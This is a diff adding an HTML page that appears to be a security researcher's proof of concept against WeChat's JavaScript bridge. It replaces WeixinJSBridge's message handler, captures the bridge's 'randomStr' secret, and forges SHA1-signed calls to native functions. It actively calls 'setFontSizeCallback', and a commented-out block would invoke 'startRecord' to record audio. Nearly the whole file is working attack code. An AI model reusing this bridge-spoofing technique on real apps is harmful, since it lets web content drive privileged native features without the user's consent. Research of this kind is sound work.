@@ -1,0 +1,189 @@
+<html>
+<body>	
+	<h1>Please be chainged font size..</h1>
+	<pre id='log'></pre>
+	<input type=button value="Push me"></input>
+	<script>
+		var __Mywx = undefined;
+		var _callback_count = 1004;
+		var isDgtVerifyEnabled = true;
+		var orig_handleMessageFromWeixin = undefined;
+		const EVENT_ID = '__event_id';
+		const SHA_KEY = '__sha_key';
+		var randomStr = undefined;
+		var JSON_MESSAGE = '__json_message';
+		var MESSAGE_TYPE = '__msg_type';
+		var PARAMS = '__params';
+
+		// TODO: Compare Crypto Object's SHA1 algorithm to CryptoJS of WX
+		(typeof Crypto=="undefined"||!Crypto.util)&&function(){var d=window.Crypto={},m=d.util={rotl:function(a,c){return a<<c|a>>>32-c},rotr:function(a,c){return a<<32-c|a>>>c},endian:function(a){if(a.constructor==Number)return m.rotl(a,8)&16711935|m.rotl(a,24)&4278255360;for(var c=0;c<a.length;c++)a[c]=m.endian(a[c]);return a},randomBytes:function(a){for(var c=[];a>0;a--)c.push(Math.floor(Math.random()*256));return c},bytesToWords:function(a){for(var c=[],b=0,i=0;b<a.length;b++,i+=8)c[i>>>5]|=(a[b]&255)<<24-i%32;return c},wordsToBytes:function(a){for(var c=[],b=0;b<a.length*32;b+=8)c.push(a[b>>>5]>>>24-b%32&255);return c},bytesToHex:function(a){for(var c=[],b=0;b<a.length;b++)c.push((a[b]>>>4).toString(16)),c.push((a[b]&15).toString(16));return c.join("")},hexToBytes:function(a){for(var c=[],b=0;b<a.length;b+=2)c.push(parseInt(a.substr(b,2),16));return c},bytesToBase64:function(a){if(typeof btoa=="function")return btoa(f.bytesToString(a));for(var c=[],b=0;b<a.length;b+=3)for(var i=a[b]<<16|a[b+1]<<8|a[b+2],l=0;l<4;l++)b*8+l*6<=a.length*8?c.push("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(i>>>6*(3-l)&63)):c.push("=");return c.join("")},base64ToBytes:function(a){if(typeof atob=="function")return f.stringToBytes(atob(a));for(var a=a.replace(/[^A-Z0-9+\/]/ig,""),c=[],b=0,i=0;b<a.length;i=++b%4)i!=0&&c.push(("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(a.charAt(b-1))&Math.pow(2,-2*i+8)-1)<<i*2|"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(a.charAt(b))>>>6-i*2);return c}},d=d.charenc={};d.UTF8={stringToBytes:function(a){return f.stringToBytes(unescape(encodeURIComponent(a)))},bytesToString:function(a){return decodeURIComponent(escape(f.bytesToString(a)))}};var f=d.Binary={stringToBytes:function(a){for(var c=[],b=0;b<a.length;b++)c.push(a.charCodeAt(b)&255);return c},bytesToString:function(a){for(var c=[],b=0;b<a.length;b++)c.push(String.fromCharCode(a[b]));return c.join("")}}}();(function(){var d=Crypto,m=d.util,f=d.charenc,a=f.UTF8,c=f.Binary,b=d.SHA1=function(a,l){var g=m.wordsToBytes(b._sha1(a));return l&&l.asBytes?g:l&&l.asString?c.bytesToString(g):m.bytesToHex(g)};b._sha1=function(b){b.constructor==String&&(b=a.stringToBytes(b));var c=m.bytesToWords(b),g=b.length*8,b=[],d=1732584193,h=-271733879,j=-1732584194,k=271733878,f=-1009589776;c[g>>5]|=128<<24-g%32;c[(g+64>>>9<<4)+15]=g;for(g=0;g<c.length;g+=16){for(var o=d,p=h,q=j,r=k,s=f,e=0;e<80;e++){if(e<16)b[e]=c[g+e];else{var n=b[e-3]^b[e-8]^b[e-14]^b[e-16];b[e]=n<<1|n>>>31}n=(d<<5|d>>>27)+f+(b[e]>>>0)+(e<20?(h&j|~h&k)+1518500249:e<40?(h^j^k)+1859775393:e<60?(h&j|h&k|j&k)-1894007588:(h^j^k)-899497514);f=k;k=j;j=h<<30|h>>>2;h=d;d=n}d+=o;h+=p;j+=q;k+=r;f+=s}return[d,h,j,k,f]};b._blocksize=16;b._digestsize=20})();
+
+		function mylog(string) {
+		  	var log = document.getElementById('log');
+		  	if (log) {				
+		    		log.innerText += string+'\n';
+		  	}
+		}
+
+		function sendMessage(msg)
+	  	{
+	  		mylog('sendMessage gogo');
+
+	  		var msgArray = []; msgArray.push(msg);
+	  		var msgArrayString = JSON.stringify(msgArray);
+
+	  		if( isDgtVerifyEnabled )
+	  		{
+	  			var arr = new Array;
+			    arr[0] = msgArrayString;
+			    arr[1] = randomStr; // fxxk _xxyy!
+			    var str = arr.join("");
+			    var msgSha = '';
+
+			    var shaObj = Crypto.SHA1(str);
+			    msgSha = shaObj.toString();
+
+			    var retMap = {};
+			    retMap[JSON_MESSAGE] = msgArray;
+			    retMap[SHA_KEY] = msgSha;
+			    msgArrayString = JSON.stringify(retMap);
+	  		}
+
+			__Mywx._sendMessage(msgArrayString);
+
+			mylog('[#] __Mywx._sendMessage finish!');
+	  	}
+
+	  	function call(func, params) {
+	  		if(typeof params !== 'object') {
+	  			params = {};
+	  		}
+
+	  		var callbackID = (_callback_count++).toString();
+
+	  		var msgObj = {
+	  			'func': func,
+	  			'params': params
+	  		};
+
+	  		msgObj['__msg_type'] = 'call';
+	  		msgObj['__callback_id'] = callbackID;
+
+	  		if( __Mywx === 'undefined' )
+	  		{
+	  			mylog("[!] __Mywx is nullptr, shit!");
+	  			return;
+	  		}
+
+	  		sendMessage(JSON.stringify(msgObj));
+	  	}
+
+	   	function setFontSizeCallback(argv)
+  		{
+  			mylog('[^] setFontSizeCallback call, fontSize: ' + argv.fontSize);
+
+  			call('setFontSizeCallback', {
+  				"fontSize" : argv.fontSize
+  			});
+
+  			mylog('[^] setFontSizeCallback Done');
+  		}
+
+	   // 	function startRecord()
+  		// {
+  		// 	var data = {
+  		// 		"appId" : "",
+  		// 		"duration" : 5
+  		// 	};
+
+  		// 	call('startRecord', data);
+
+  		// 	mylog('startRecord Done');
+  		// }
+
+  		if(typeof window.__wx !== 'undefined') {
+	    	__Mywx = window.__wx;
+	    	__Mywx._ready(true);
+
+	    	mylog('[+] __wx is alive, yeah!');
+	    }
+
+		window.WeixinJSBridge = {
+			_handleMessageFromWeixin : function (message) {
+        		mylog("[-] Call Hooked WeixinJSBridge._handleMessageFromWeixin");
+
+        		var msgWrap;
+
+        		// save randomStr
+        		var realMessage = message[JSON_MESSAGE];
+        		if( realMessage !== 'undefined' && realMessage[EVENT_ID] == 'sys:updateRandomStr' ) {
+        			randomStr = realMessage['randomStr'];
+        			mylog("[*] updateRandomStr: "+randomStr);
+        			return "{}";
+        		}
+
+        		if( realMessage !== 'undefined' )
+        		{
+        			mylog("[-] __event_id : " + realMessage[EVENT_ID] + " __params : " + realMessage[PARAMS]);
+        			var arr = new Array;
+	      			arr[0] = JSON.stringify(realMessage);
+	      			arr[1] = randomStr;
+	      			var str = arr.join("");
+	      			var msgSha = '';
+	      			var shaObj = Crypto.SHA1(str);
+	      			msgSha = shaObj.toString();
+
+	      			msgWrap = realMessage;
+
+	      			mylog("[?] SHA1 : " + msgSha);
+        		} else {
+        			msgWrap = message;
+        		}
+
+        		switch( msgWrap[MESSAGE_TYPE] )
+        		{
+        			case 'event':
+        			{
+        				mylog('event');
+        				switch( msgWrap[EVENT_ID] )
+        				{
+        					case 'menu:setfont':
+        					{
+        						mylog('menu:setfont');        						
+        						var ret = setFontSizeCallback(msgWrap[PARAMS]);
+        						return JSON.stringify(ret);	
+        					}
+        				}
+        				break;
+        			}
+        		}
+    			// return orig_handleMessageFromWeixin(msg);
+			}
+  		};	    
+
+	    // var loop = setInterval(()=> {
+	    // 	if( typeof window.WeixinJSBridge !== 'undefined' ) 
+	    // 	{
+		  	// 	mylog('[-] WeixinJSBridge');
+		  	// 	clearInterval(loop);
+
+		  	// 	orig_handleMessageFromWeixin = window.WeixinJSBridge._handleMessageFromWeixin;
+
+		  	// 	if( orig_handleMessageFromWeixin === 'undefined' ) {
+		  	// 		mylog("[!] ERROR, _handleMessageFromWeixin");
+		  	// 		return;
+		  	// 	} else {
+		  	// 		mylog("[+] Hook WeixinJSBridge._handleMessageFromWeixin");
+		  	// 	}
+	    // 	}
+	    // }, 100);
+
+	 //   	window.addEventListener('load', function(event) {
+	 //   		for(var i=1; i<9; i++) {
+	 //   			var x = {"fontSize":i.toString()};
+	 //   			setFontSizeCallback(x);
+	 //   		}
+		// });
+  </script>
+</body>
+</html>
